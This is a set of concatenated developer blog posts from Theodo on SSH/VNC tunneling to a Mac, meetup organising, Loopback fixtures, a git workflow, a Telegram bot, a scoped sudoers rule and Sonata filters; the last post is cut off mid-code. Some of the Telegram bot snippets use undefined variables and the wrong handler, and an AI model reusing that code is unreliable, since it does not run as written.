You might find articles suggesting installing OS X (or macOS as it’s now branded) in a virtual machine, but this breaches Apple’s EULA and often involves downloading unverifiable versions from the internet. The section (2.B) also states that a business can allow multiple users to use the same Mac, so these instructions can be used for a whole development team.
Why?
I’m a Linux user. There are many reasons behind this but since this is a professional blog I won’t go into them; suffice to say I’d rather figure out the content of this post than switch to Mac.
I’ve been doing a lot of React Native development recently and while it runs Javascript internally, it uses native user interface components (rather than a webview), so you need to be able to compile the real app. Android can be built anywhere even Android but iOS is more fussy.
The techniques used here can also be used for any secure tunneling so even if you love the drag-to-install world you can benefit from them.
What?
I bought a Mac Mini, which now lives on my desk at home. I set up SSH to allow me to connect from anywhere and then tunneled VNC over it to allow for secure remote desktop connections. I have a copy of the iOS code on the Mac (which changes infrequently) which I can run in the simulator and through more tunneling it runs the javascript directly from my laptop.
Confused?
I’ll go into it. But in the end, the result looks something like the screenshot at the top of the page.
How?
I’m glad you asked:
Unpacking the Box (Setting Up SSH)
On the Mac (you’ll need a display for this), open System Preferences, go to ‘Sharing’ and enable Remote Login and Screen Sharing. The Remote Login page will helpfully tell you your local IP to connect to from your development machine, use this to copy over your ssh public key. If you don’t already have a key, use the ssh-keygen command and follow the prompts to create one. The easiest way to get your key over is:
# On your development machine
$ cat ~/.ssh/id_rsa.pub
# Select the output and copy
$ ssh user@192.168.X.Y
$ nano ~/.ssh/authorized_keys
# paste in contents of your public key then ctrl-x to exit
For security, on the Mac you want to disable password authentication, so open the file /etc/ssh/sshd_config and add the following lines. You’ll need to restart ssh for them to take effect, the easiest ways being disable and re-enable remote access or reboot:
PasswordAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
If you’re feeling really paranoid you can also lock down the firewall as long as sshd-keygen-wrapper can accept connections.
The last step is to set up port forwarding through your home router. I can’t tell you how to do this as it depends on what router you have. You’ll need to go to the configuration page by going to its IP address in a web browser (normally 192.168.0.1 or 192.168.1.1), it’ll probably be in advanced settings somewhere under port forwarding. What you want to set up is a forward of TCP traffic from a random high numbered port (e.g. 9329) on the public side to port 22 on your Mac. The default port for ssh is 22 (and macOS seems to ignore attempts to change the config) but moving it to another port externally means that anyone trying to connect to random IPs won’t find it. Mine looks like this:

Wiring It All Up (SSH Port Forwarding)
Now for the interesting part, which is also generally useful for port forwarding, so feel free to replace ‘Mac’ with any remote machine you want to play with. We’re going to set up an ssh configuration which will allow you to reuse your settings without having to remember the whole command. You can do the same without a config and I’ll give you that too.
The main concepts here are ‘local’ and ‘remote’ forwards. Simply put, SSH binds to a port on one side, this prevents any other processes from binding to that port, but allows it to accept connections. When anything tries to connect to the port it forwards that request to the other port on the other machine, so it goes to whatever is bound to the other port.
For example VNC will be bound to port 5900 on the Mac, waiting for a remote machine to connect. We want SSH to bind to a port on our development machine and forward any connections to the Mac on port 5900. This is called a ‘local’ forward as the bound port is local.
In my example I’ll be setting up for React Native development, so I want to run services like the packager locally. It’ll transpile the Javascript and send it to the device when running in development mode, allowing for hot reloading and other such goodies. It’ll be bound to port 8081 by default, and when I run the app on the Mac it’ll try to connect to 8081, so I want SSH to be bound to the remote port 8081 and forward the connections to local port 8081. You might have guessed this is called a ‘remote’ forward.
For this step you’ll need the public IP of your Mac’s location. The answer to this (and to many other questions) can be discovered by visiting this link from your Mac. Unless you’ve paid for a static IP, it will change, but for me this hasn’t happened more than every few months. I don’t have a good solution to this yet other than changing your config whenever it changes (but try the link I just gave). On your dev machine open a file at ~/.ssh/config and add the following (indentation is important):
Host mac-mini-vnc
  Hostname <your home network's public IP here>
  Port <your public ssh port here>
  User <username on Mac>
  # VNC
  LocalForward 5900 127.0.0.1:5900
  # React Native packager
  RemoteForward 8081 127.0.0.1:8081
  # Redux remote debugger
  RemoteForward 8000 127.0.0.1:8000
  # Default port for node.js, so my development backend
  RemoteForward 3000 127.0.0.1:3000
You can activate all this by running ssh mac-mini-vnc, optionally adding the -N or -f options to not open a remote terminal and to run in the background respectively. If you want to run the above without a config (with the -fN), the command is:
ssh -fN -p <port> -L 5900:127.0.0.1:5900 -R 8081:127.0.0.1:8081 -R 8000:127.0.0.1:8000 -R 3000:127.0.0.1:3000 <user>@<IP address>
Which is why I use a config file.
Starting It Up
Now you should be able to open a VNC client on your development machine (I use KRDC) and connect it to <user>@localhost:5900. You’ll need to put in the username and password for your Mac and you should see your desktop. I needed to turn down the screen resolution on the Mac to improve the responsiveness, unfortunately this can only be done while the real screen is on.
You need to have the iOS part of the app built and run on the Mac so you’ll need to follow the instructions for setting up React Native iOS development. Once you’re done clone your project and npm install the dependencies as these can include native parts. You’ll also want to have the project set up on your development machine, and start the packager with react-native start. Now you can finally run the project on the Mac by running react-native run-ios, this will build the app and deploy it to the iOS simulator.
You’ll still need to set up Redux and a back-end server to make use of the other routes, but for now you can enjoy the fun of React Native by making a change on your development machine, go to the VNC window, hit meta-r (cmd-r to the mac, it’ll most likely be a windows-r on your machine), and see the changes.
Final Thoughts
So there you go, iOS app development from a Linux machine. Admittedly it requires buying a Mac, but you don’t need to change your normal operating system or buy an overpriced Macbook (Mac Minis start at £400/550€). It might not be as easy as doing it from a Mac, but you’re probably not using Linux because it’s easy.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Richard Miller
  			
  				Architect-Developer at Theodo UK.  			
  		
    
			

									"
"
										
      Three months ago, we organized our first meetup in London: the React Native London meetup.
      Fourty React Native developers showed up at our office to discuss the use of Redux alongside React Native and a whole lot of other things.
    
Since then we have organized two other such meetups.
Overall, I think it's been a great success: we hit the guest limits pretty quickly each time and the attendees seem to like it.
We plan on having such meetups every month, so if React and mobile development are your thing, come and join us!
The following is our recipe to organize a meetup from scratch and get started.
    It describes the way we organized ours and might not correspond to what other people do or recommend.
    But it worked out for us, so we might as well share it!

      This article is built as a checklist to help you organize your meetup.
      It's quite comprehensive and maybe a bit obvious at times, but it's what a checklist should be like, right?
    
In this article I'm kind of assuming you're targeting a developers audience but feel free to adapt this checklist to your needs!
Alright, let's start.
Choose a cool topic
Some advice for a successful meetup:


        Pick a trending topic. Lots of people interested means more attendees.
      

        Make sure there isn't already a similar meetup in your area. Eg. who needs a ""London React Native Community"" when there is already a ""React Native London"" meetup ?
      

That's it for this part. </CaptainObvious>
Build an organisation team

      Organising a meetup requires a lot of not-forgetting-stuff and making-sure-stuff-is-ready.
      Doing so in a team allows you to remind and challenge each other, which is always for the best.
    
I found a 3 people team to be quite effective but you'll be fine as long as you have a handful of people willing to help.


        There is an organisation team. Around three people is cool.
      

Get public
Time to create your page on meetup.com. Head to the meetup creation page and fill the form.


        Your meetup name should be as simple as possible. ""Greater London React Native Community Meetup"" is difficult to understand and even harder to remember. ""React Native London"" is much simpler.
      

        Choose the unlimited plan. You definitely want more than 50 members.
      

        Give co-organiser access to your team. So everyone can contribute and plan meetups.
      

        Customize your meetup page. Choose a colour palette and a banner matching the theme of your meetup. The group logo and the cover photo are very important as well, they're the first things potential members will see when browsing meetup.com
      

        Create your first meetup event. No need to set a date or venue right now, this is just a draft to show your visitors you're serious.
      

        Invite everyone. People at your company, acquaintances interested in the topic, friends, etc.
      

Prepare your first meetup
Talks
This is a bit of a developer-centric section. Maybe your meetup isn't about people giving talks in front of the audience, in which case the question you should try to answer in this section would be ""what will members be doing when they show up?"".
    Anyway, back to our developer meetup.
Hopefully you already know someone willing to give one (or someone you can coerce into giving one). If that isn't the case the simplest solution is to give one yourself.


        Have at least one speaker commited to giving a talk. Don't worry if you can only find one speaker, openspaces are always a good option to keep the discussion going. More about that below.
      

Set a date and a place
The sooner it happens the better! No need to overthink it, you should be able to go through this checklist in a matter of days, a couple weeks at most.


        Set a definitive date on the event page. Ideally in less than two weeks.
      

For the venue, your company's office is the first solution that comes to mind. It may not be an option for everyone so you can also explore alternative options such as co-working spaces, office space companies, etc.


        Set a venue on the event page. With an address and instructions detailing how to get there from the nearest tube station/bus stop.
      

        Put a limit to the number of people you can host. Depending on the venue. Also, enable the waiting list!
      

You should always expect less people than the number of ""Yes"" RSVP in meetup.com (although it depends on the audience/success of the meetup), but don't put the limit at 60 if you can host 30 or you'll have problems!
Spread the word
Time to reach out to everyone in your area and fill your first meetup!


        On the internet. Reach out to developer communities around you using Twitter, Slack chans, Gitter, etc.
      

        Related meetups. Attend meetups similar to yours, become friends with the organizers and ask everyone to join yours.
      

Prepare


        Create the following event on meetup.com. So you can talk about it during the meetup. Without date or venue if necessary.
      

        Plan for food. Don't forget paper plates, napkins and bottle openers. Also, healthy food is good, pizza isn't your only option!
      

        Get a video projector. And a white screen.
      

        Rehearse. At least once. Introduction (you) and talks (speakers).
      

The day of the meetup


        Make sure attendees can enter the building. Have someone open the door / guide people to the room if necessary.
      

        Serve food and drinks. And talk to the attendees, learn from them: what do they want to learn/see?
      

        Give your introductory talk. What is this meetup about? When do we meet? We need your help! ""Btw, next meetup is on meetup.com!""
      

        Talks. Prepare a few questions in case there are none at the end of the talks. A lightsaber makes for a very good presentation stick.
      


      If you do not have enough talks for the duration of your meetup, now is the time to use one of our favourite learning/leadership format at Theodo: the Open Space.
      It is a great way to get people talking on the subjects they're interested in.
    


        (optional) Organize an Open Space. If you don't have enough talks.
      

Last but not least, probably the most important part of the meetup:


        Reach out for people willing to help. Be it by giving talks or helping with the organization. Don't forget to get their contact info (mail, twitter, etc).
      

Follow-up


        Retrospective. What went wrong? What went right? Find ways to improve for next time.
      

        Give feedback to the speakers. Help them help you.
      

        Reach out to the people you met. Stay in contact with those interested in giving a talk or helping with the organization. Thanks attendees on meetup.com.
      

Good job, you've reached the end of the checklist, that means you should be ready to host your own meetup!
    Tell us how it was and let us know your suggestions to improve this checklist.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nathan Gaberel
  			
  				Architect-developer at Theodo UK  			
  		
    
			

									"
"
										
  Are you a Loopback user?
  Have you ever wondered how to get extra quickly randomized data fixtures for your project?
  Are you fed up with writing for loop, using Math.random or generating INSERT INTO statements with Excel?


  On my first project with Loopback in Theodo, that was the kind of issues I was facing with data fixtures generation.


  We developed a visualization tool of financial data using tables and graphs with my team. We had to use dozens of raw data stored in our database in order to display one cell of a table or a single point of a graph.  And we can not use real production data for security and privacy reasons.


  At Theodo, we work with the Scrum methodology, which implies in particular that each developed feature must be validated by the Product Owner of the project. To enable the Product Owner to validate this feature, we should then be able to produce a consistent and representative set of data, so that we can verify that the developed visualisation tool provides a clear enough vision to deliver real business value to users.
  Our problem was to generate large sets of random data.


  After a tedious attempt where I used Excel to generate INSERT statements in SQL, and another where I used a combo of for loops, Math.random and MomentJS: the generated code was becoming so unreadable and so complex that I could not adjust parameters to generate relevant set of data.


  Above all, I come from the world of PHP, I have worked on many projects in Symfony2.


  In PHP, nelmio/alice is a simple and pragmatic solution, and I decided to take inspiration from this library to solve my problem.
I have written a Loopback component published on NPM that enables to quickly generate huge sets of random data:


  https://github.com/sghribi/loopback-fixtures


  This library has following features:


Generate data based on your Loopback model (and not your database scheme)
Load data with YAML
Integrate a fake data generator: FakerJS
Generate massive range of data thanks to helpers
Handle easily relations between your models

Let’s see it in action!
Quick install

Step 1: install component

npm install --save loopback-fixtures

Step 2: enable component

Then, in your server/component-config.json, add :
{
  // Other components...
  ""loopback-fixtures"": {}
}

Step 3: write a YAML fixture file: fixture/data/data.yml

Let’s see how it works with examples in the next part.
Demo with User and Group models
Let’s suppose we have two models:


    Group: name
  

    User: name, email and description, and linked to Group model
  

This will generate 3 users with random name and email:
User:
  user_blue:
    name: ""{{name.firstName}} {{name.lastName}}""  # <-- {{name.firstName}} : random first name
    email: ""{{internet.email}}""                   # <-- {{internet.email}} : random email
  user_white:
    name: ""{{name.firstName}} {{name.lastName}}""
    email: ""{{internet.email}}""
  user_red:                                       # <-- user_red : should be an unique reference
    name: ""{{name.firstName}} {{name.lastName}}""
    email: ""{{internet.email}}""

In this first example, we are using FakerJS to provide random names for these three generated users: {{name.firstName}} {{name.lastName}}.
This will generate 1000 users with random data:
User:
  user_{1..1000}:                    # <-- {1..1000} : duplicate this line 1000 times
    name: ""{{name.firstName}}""
    description: ""I'm user n°{@}!""   # <-- '{@}' will be remplaced by : 1, 2... 1000

The helper user_{1..1000} is a shortcut to write: user_1, user_2… user_1000.
This will generate 1000 users in two groups:
Group:
  humans:                               # <-- is referenced by @humans
    name: ""The Humans""
  robots:
    name: ""We are ROBOTS""

User:
  human{1..500}:
    description: ""I'm human n°{@}!""
    groupId: @humans                    # <-- this references ""humans"" Group
  robot{1..500}:
    description: ""I'm robot n°{@}!""
    groupId: @robots

The notation @humans is used to handle relations between generated data: it refers to the humans group.
This will generate 1000 users randomly dispatched in 10 groups:
Group:
  group_{1..10}:
    name: ""Group n°{@}""

User:
  users_{1..1000}:
    name: ""{{name.firstName}} {{name.lastName}}""
    groupId: @group.*

These examples show you how you can customize your fixture file to get extra quickly massive randomized data.
You can read and discover all awesome features provided by this component by reading the README.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Samy Ghribi
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										On the project I work, we needed to deploy in production several times a day, for business purposes, but the deployments took one and half hours. Indeed, we are several teams working along with the Scrum methodology, so our product owners are validating all our work. Thus we spent two thirds of our time to identify and isolate what has actually been validated and is ready to go in production.
We created a new git workflow, inspired by the article A successful Git branching model, and adapted to the Scrum methodology. It helped us to organise our deployment process and to reduce our deployment time to 30 minutes.

Our workflow is composed by 3 main branches :

The develop branch can be seen as the Truth : every line of code has been tested and validated by the client.
The staging branch corresponds to the validation environment.
The release branch contains the last version of your website in production.
The feature branches are temporary.

The Git journey of a simple feature
Let’s assume Alice and Bob develop an e-commerce website and she needs to register the shipping address of her customers. This feature could be splitting into 3 user-stories : adding a shipping address, editing it and removing it. All the three tickets are in the Sprint Backlog.
She starts with the first user story, adding an address. The corresponding ticket is now in the Doing Column.
git checkout develop && git pull origin/develop
// She creates a new feature branch and a new user story one
git checkout -b feature/shipping-address
git checkout -b add-address
// She codes and commits

In the meantime, Bob wants to help Alice and starts coding the address deletion.
// He pulls the last version of the shared branch
git checkout feature/shipping-address
git pull origin/feature/shipping-address
// He creates a new branch for the user story
git checkout -b delete-address
// He codes and commits


Alice finally finishes her feature locally, she puts the ticket into Code Review.
// She pushes her code to the staging branch
git push origin add-address
// She opens a pull request with the staging environment
git request-pull staging add-address
Once Bob has reviewed her code, she can merge her branch into staging. The ticket is now in the Validation column, waiting for the Product Owner validation.
// She gets the last version of the staging branch
git checkout staging && git pull origin/staging
git merge add-address && git push origin staging
// She builds the validation environment 
// and asks the product owner to validate

The product owner has validated Alice’s work, the ticket finally in the Done column. She merge her work into the feature branch and starts another user story.
// She pulls the last version of the feature branch
git checkout feature/shipping-address 
git pull origin feature/shipping-address
git merge add-address && git push origin feature/shipping-address
When the whole feature has been validated by the client, Alice merges the feature branch into develop, as it’s ready to go into production.
// She gets the last version of the develop branch
git checkout develop && git pull origin/develop
git merge feature/shipping-address && git push origin develop

At the end of the day, when they want to deploy into production, Bob merges develop into release and launches the deployment without any concern. Indeed he knows that all the code on develop is correct. He tags the commit of the release to get the history of each version.
// He gets the last version of the develop and release branches
git checkout develop && git pull origin/develop
git checkout release && git pull origin/release
git merge develop && git tag 2.1 
git push origin release --tags

The four rules of this workflow
This workflow can seem to be heavy but after few days you become use to it.
Nevertheless, you have to remember four rules:

Be strict : no inopportune commit on develop and not staging.
Stay tuned : a feature is not done anymore right after the product owner validation, you need to merge your branch into develop to prepare the next release.
Be clean : as it can drift apart, you should clean the staging repository every week. You should delete the staging branch, locally and remotely, and recreate it from develop :
git co develop && git pull origin/develop
git branch -d staging && git push origin --delete staging
git co -b staging && git pull origin staging

Divide and Conquer : two features should be really distinct. Either they don’t use the same part of the code, either they are not developed at the same time. Yet, some conflicts could still happen between two user story branches, don’t panic. Let’s take an example. Alice and Bob have both added a translation at the same line in the translation file. Bob have merged his branch into staging before Alice, thus when she want to push she has conflicts with staging. What she could do is to pull the staging branch, merge her branch into it. Then she had to resolve the conflicts and my advice is to do it with Bob to address them together. Then she can push the merge branch to staging :
git co staging && git pull origin/staging
git merge alices-branch
// Resolving conflicts
git commit
git push origin staging


 
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Aurore Malherbes
  			
  				Web Developer at Theodo  			
  		
    
			

									"
"
										When we design a product at Theodo, we follow the Lean Startup methodology. Which means we try to ship a Minimum Viable Product for our clients as soon as possible, and then iterate on this product using final user feedback in order to avoid developing useless features.
This methodology implies focusing on the core business features. However, while developing a product, you often face many other challenges (design, technical infrastructure) that might slow you down and distract you from creating value for your customer.
In this vein, Chatbots are a way to create the perfect MVP. Chatbots are software services that you offer through traditional messaging apps that users already installed on their phones (the most famous of them being Facebook Messenger, Whatsapp, Slack, Telegram… ). Since you are bound to using the conversational interface provided by those services, you do not need to focus on things like design and delivering message in real time through a robust infrastructure: those platforms do it for you.
In this series of blog posts, I will show you the potential of different messaging platforms on which you can easily build bots through an example I personally implemented: a bot to search through movie showtimes around me in Paris.
Telegram
The first platform I will introduce is Telegram since it is the easiest one to work with. It has a huge community of over 100M monthly active users, and is free of charge and cross-platform.
Step 1: Talk to the BotFather
In order to create a bot, you have to talk… to a bot!



The Botfather
Get your application token









Get in touch with the BotFather on Telegram in order to create a bot, give it a profile picture, and get a token to be notified when it receives messages – and answer accordingly.
Now I advise storing this token in your .bash_profile or equivalent in order to use it in your code.
export CINEBOT_TELEGRAM_TOKEN=XXXXX

Listening to your Bot
In order to fetch messages received by your bot, Telegram offers two options: Long Polling and Webhooks
Long Polling

Long polling is a way to retrieve new information from the server. Unlike traditional polling – which opens an HTTP connection, fetches the newest results, and then closes the connection, every X seconds – long polling makes an HTTP request to the server and keeps that connection open until it receives fresh informations, and then closes the connection. We only send a ping when the connection is closed, either because we received data, or because the request timed out.
Webhooks

Webhooks are one of the most used technologies to implement reaction on an event happening on a distant server. The idea is to indicate to the chatbot platform (Telegram, Facebook Messenger) an endpoint on which your application will be listening. Whenever your bot receives a message, the chatbot platform sends a POST request to this endpoint, containing information about the messages your bot received (sender identifier, content, location, etc…). Since you need to specify an IP address, it requires that you host your application on a server, unless you use a tunneling application like Ngrok that allows you to generate a fixed proxy address that redirects to your localhost. Read this article by my fellow Theodoer Matthieu Augier if you’re interested in that.
Getting started
I chose to implement this application in NodeJS, since it allows us to handle asynchronous events (like receiving messages and responding) by default, and is fast as well as commonly understood.
mkdir cinebot
npm init
npm install --save node-telegram-bot-api
touch bot.js

Now we’ll start coding! The code I will insert here can be found in a demo repository I created for this article. It contains the code for the whole Telegram bot as well as a mock for the showtimes API.
Handling messages
I chose to use a NodeJS library that allows for listening to event received by my bot and react accordingly. Here I chose the option to listen to messages using long polling because it allows you to get your bot up and running in a few minutes.
  var TelegramBot = require('node-telegram-bot-api');
  var CineApi = require('./cine-api.js')

  var telegramToken = process.env.CINEBOT_TELEGRAM_TOKEN;

  // Setup polling way
  var bot = new TelegramBot(telegramToken, {polling: true});
  var cineApi = new CineApi();

The CineApi class implements methods that will enable us to query showtimes data using text and location, as well as format the response for sleek display.
  CineApi.prototype.query = function(text, location, onResultCallback) { ... }

  CineApi.prototype.formatTitle = function(hit) { ... }

  CineApi.prototype.formatDescription = function(hit) { ... }

Saying Hello
A good way to get your user onboard is through a warm welcome message, which you can also use to explain how to converse with your bot. For this purpose, I advise to create a file introduction.txt within your bot folder, that will contain that message.
Then you need to listen to the /start command which a user automatically triggers when they want to converse with your bot
  bot.onText(/\/start/, function(msg, match) {
    var chatId = msg.from.id;
    bot.sendMessage(chatId, introText);
  });

node bot.js

Now engage with your Bot – from your phone, or the Telegram web view – WOW 😍

Handling text messages
The first step for the bot is to be able to fetch showtimes based on some text from the user.
  bot.on(/\/showtimes (.+)/, function(msg, match) {
    var queryText = match[1]
    var chatId = query.chat.id

    cineApi.query(queryText, null, function(result) {
      var seances = content.hits;
      var response = ''
      for(var i = 0; i < seances.length; i++) {
        var seance = seances[i]
        var response = cineApi.formatTitle(seance) + '\n' + cineApi.formatDescription(seance) + '\n'

        bot.sendPhoto(chatId, seance.movie.posterUrl, {caption: response})
      }
    });
  });


Handling location messages
Usually, I find myself in situations where I want to go see a movie nearby, but I do not know where the closest cinema is, or which movies it features. Therefore, I want to be able to send my location to my bot, and retrieve the showtimes of theaters around me.
  bot.on('location', function(message) {
    var chatId = message.chat.id

    // Doesn't hurt being polite
    bot.sendMessage(chatId, 'Thanks for your location!')

    cineApi.query(' ', message.location, function (content) {
      var showtimes = content.hits;
      var response = ''
      for(var i = 0; i < seances.length; i++) {
        var seance = seances[i]
        var response = cineApi.formatTitle(seance) + '\n' + cineApi.formatDescription(seance) + '\n'

        bot.sendPhoto(chatId, seance.movie.posterUrl, {caption: response})
      }
    });
  })


Reducing friction: use custom keyboards
Using location is great, but it requires the user to make the effort of sending you his location. To reduce the friction even more, you can use custom keyboards to control the users choices, and bind actions to buttons to improve the user experience. Let’s see below how we can improve our intro message to directly engage the user by offering them the choice to try the service with just one tap.
  // Editing directly the /start callback
  bot.onText(/\/start/, function(msg, match) {
    var chatId = msg.from.id;
    bot.sendMessage(chatId, introText);

    var opts = {
      reply_markup: {
        keyboard: [[{'text': 'Oui', 'request_location':true} ], ['Non']],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    }
    setTimeout( function() {
      bot.sendMessage(chatId, 'I need your location to help you! Can you send me your location?', opts);
    }, 3000)
  });

Mimicking a human being by setting a fake 3 seconds wait is also a way to make your user experience more natural.

Combining both with inline queries
An amazing feature from Telegram is that you can query a bot directly from a conversation with someone else. This allows us to combine text and location-based searches in a very natural way:
bot.on('inline_query', function(request) {
  var queryText = request.query;
  var queryLocation = request.location
    var inline_query_id = request.id;
    cineApi.query(queryText, queryLocation, function (content) {
        var hits = content.hits;
        var inlineResults = []

        for(var i = 0; i < hits.length; i++) {
            var inlineResult = hitToInlineResult(hits[i]);
            inlineResults.push(inlineResult);
        }

        bot.answerInlineQuery(inline_query_id, inlineResults);
    });
});

This can prove useful in many situations, like for example when you need to quickly set up a movie date with Scarlett Johansson!

Ready for production
We now have a working useful bot that runs in local. But if you want your bot to stay up and running at all time so that you can sleep peacefully, you’ll need to deploy your bot on a server and run a process manager to take care of it.
I personally use Digital Ocean which has one of the cheapest plans out there. Coupled with pm2, I can sleep safe knowing that my bot is ready to help night wanderers find the right movie at the right theater, at all time.
You can use the bot here if you want to test it live! However it only gives you the showtimes of French theaters around Paris at the moment.
That’s all folks!
Just kidding, a second part is coming! That one will focus on Facebook Messenger: with over a billion daily active users, it is currently the most used messaging app in the world, and offers slightly different functionalities compared to Telegram.
I will also discuss the best ways to remember users in order to re-activate them on a regular basis.
Data & Credits
Built with  , with data from   
Interested in building a Chatbot ? Please leave a comment if you need advice or just want to discuss 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jérémy Gotteland
  			
  				Full-Stack Agile Developer @ Theodo  			
  		
    
			

									"
"
										© xkcd
Here is how I managed to save time on my PHP project by enabling restarting services automatically during deployment.
Basic capistrano configuration
When I work on PHP projects I deploy using Capistrano, a tool that enables scripting of deployment tasks. During my previous project, I had to manually log in to my server and restart the php-fpm service after each deployment. I wasted almost one hour of my time every week running sudo service php5-fpm restart 10 times a day. Moreover, every once in a while I forgot to restart the service and I had to spend 30 minutes more to find out why I couldn’t see my new feature on my website.
To save time, I wanted capistrano to do it for me:
task :restart_php do
  on roles(:app) do
    execute ""sudo service php5-fpm restart""
  end
end

To do so, I needed superuser permissions. I considered giving sudo rights to the application user, but this would represent a major security issue: say there is a security breach on your application that enables an attacker to take control over the application user, they could take control over the whole server.
A solution is to grant superuser permission on a specific command.
Introducing the /etc/sudoers file and visudo command
Log in to your server as root and run sudo visudo. Visudo enables you to edit the /etc/sudoers file, in which your computer grants superuser permissions.
I added the following line:
www-data ALL=(root) NOPASSWD: /usr/sbin/service php5-fpm restart

The line is divided into 4 parts:

www-data is the user you want to grant permissions to.
ALL filters users logged in from ALL hosts name
(root) www-data has root permissions on the following command
NOPASSWD: /usr/sbin/service php5-fpm restart enables www-data to run only this exact command /usr/sbin/service php5-fpm restart without being asked any password.

You can now understand why this line in the file is the source of root superpowers:
root ALL=(ALL) ALL

With great power comes great responsibilities
Before you enable all users to run sudo commands without being asked any password (which is possible but strongly advised against), take caution using visudo: granting superuser commands must be used with parcimony.
Finally, you may ask yourself why I used visudo instead of vim /etc/sudoers file. Never edit directly the /etc/sudoers file. Visudo includes checks before saving the edited file: it prevents it from syntax errors that would cause major superuser problems on your computer.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Paul Jehanno
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										The fable
When I joined the e-annuaire project, the team used to spend half a man-day per sprint writing documentation for the end-user support (EUS). When it was my turn, I screwed my courage to the sticking place and opened the Google doc:

Bunches of screenshots of the app, where overlaid yellow boxes are referenced on spreadsheets like this:

The spreadsheet details the origin of each piece of information referenced on any page of the app, and my role was to update them one by one.
I clicked on the spreadsheet to open edition mode and… Uh, what??

Dammit! Screenshot images were simply pasted so I cannot edit the spreadsheet  I ended up creating a real spreadsheet and copying information from screenshots and I cursed the gods for what was arguably a boring work.
(Re)Act!
The boredom was the initial trigger for us to react, though this is not a valid business reason; the EUS team needs documentation material.
Filling a powerpoint presentation with ever evolving business rules is a waste of our abilities. Spreadsheets lack maintainability and we felt we should do something about it.
The support team
The support team deal with over 30 applications. In theory, anybody in the team should be able to answer any support demand on any application. In practice, each team member became an expert about 3-4 applications and our application only had a couple of experts who knew it well.
This organization introduces a single point of failure: if the two experts are missing, inexperienced team members will have to handle the app and responding time will skyrocket. Our application is critical so that’s a big deal.
If the specialization of the support team disappears, so does the the single point of failure! And guess what lead the people to specialize? Poor documentation!
What is a good documentation?
A good documentation is:

Maintainable: the documentation stays consistent with the application and team members can easily update it. That’s why self-documenting code is so popular. The easier the documentation can be updated, the more up-to-date it is.
Shareable: only one version of the documentation exists and knowledge is available to other team members
Available: distance between the problem and the solution should be as short as possible

What does it mean for our application?
So we start thinking about how to build up a documentation that is simultaneously maintainable, shareable and available.
A paper-printed documentation follows none of the three principles.
SharePoints, Google slides and their avatars are shareable but not available i.e., there is no guarantee that each support team member has access to the latest document. Most importantly, they are definitely not maintainable (see ##The fable).
In order to be available, the documentation must be reachable where the user encounters a problem i.e., in the app itself. Let’s take an example: a user call the EUS because there is a wrong phone number on a page:

For some reason, the guy answering the phone knows nothing about the e-annuaire. In order to help him, we implemented a feature displaying bubbles that appear when you click on a ‘show help’ button:

Valuable information appear under the phone number, hence the documentation is available. Now, assume the support team member reads the bubble and calls Ms Martin and discovers she left and that Ms Smith should be called. The information in the bubble needs a refresh, so we implement a feature letting support administrate help content:

Therefore, the documentation is maintainable. Finally, we ensure that every support team member sees the same help contents so that the documentation is shareable as well.
How did we do it?
Instead of spending half a man-day writing documentation, we suggested to the PO to onboard a “proof of concept” ticket. Within a week, we had bubbles in profile pages. Both the PO and the EUS team were very enthusiastic so we onboard more tickets to improve it: we spread bubbles on all pages, letting people administrate bubbles and adding contents depending on your role in the app (not only EUS team member).
It turned out to be a huge success: the PO and EUS team administrate help content themselves and the overall cost for developing the feature was less 3 man-days, compared to 0.5 man-day per sprint (and it is sprint #95)!
It was laziness that drove us first, but laziness alone is useless unless you turn it into a solution that is profitable to everybody.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Toubhans
  			
  				Web-developer at Theodo.  			
  		
    
		    
  		
  			
  				  			
  		

  		
				Nicolas Trinquier
  			
  				Nicolas is a full stack developer. Along with his fellows at Theodo, he builds, with pragmatism, tomorrow's applications.  			
  		
    
			

									"
"
										How to enforce and hide filters on a Sonata’s list view
Sonata provides you with a robust and easy to implement interface administration for your Symfony projects.
We have been using and loving it on my projects for 19 weeks now. Every day we are amazed with the time we save thanks to Sonata.
However, there are some features that our client wants that are missing. One of them is the possibility to hide filters.
Imagine you want your users to see a pre-filtered Sonata list and do not display the filters.
In our case we receive applications. Each application has a status and a at certain point we have a button “View pending application”. This button of course is supposed to list only the “pending” applications and we don’t want the users to be able to change this filter.
This solution is really straight-forward and easy to implement, give us 5 minutes and 30 lines of code!
Note: this tutorial is written for Symfony 2.8 and Sonata 2.3. Let me know in the comments if you tested it on other configurations.
The easy solution : createQuery
When you search for a solution online you easily find examples of people using the createQuery function of Sonata:
In your admin class:
class ApplicationAdmin extends SonataAdmin
{
    public function createQuery($context = 'list')
    {
        $query = parent::createQuery($context);
        $rootAlias = $query->getRootAliases()[0];
        $query
            ->andWhere($query->expr()->eq($rootAlias . '.status', ':statusPending'))
            ->setParameter('statusPending', Application::STATUS_PENDING)
            ;
            
        return $query;
    }
}

This works great but we had one major issue with that solution:

The filter is always enforced and there is no way to display the same list without it.

The better solution : hiddenFilters
In our project we had to display the same list, sometimes with hidden filters enforced, sometimes not.
That’s why we went a step further and created a “HiddenFilters” mechanism.

Use URL parameters to define which filters to set up

class ApplicationAdmin extends SonataAdmin
{
    // This array will contain our filters, filters are an object with a unique key and a value
    private $hiddenFilters;
    
    // This function reads the filters from the URL
    private function readHiddenFilters()
    {
        return $this->getRequest()->query->get('hiddenFilters');
    }
    
    // CreateQuery is called to generate the list before the admin list view is rendered
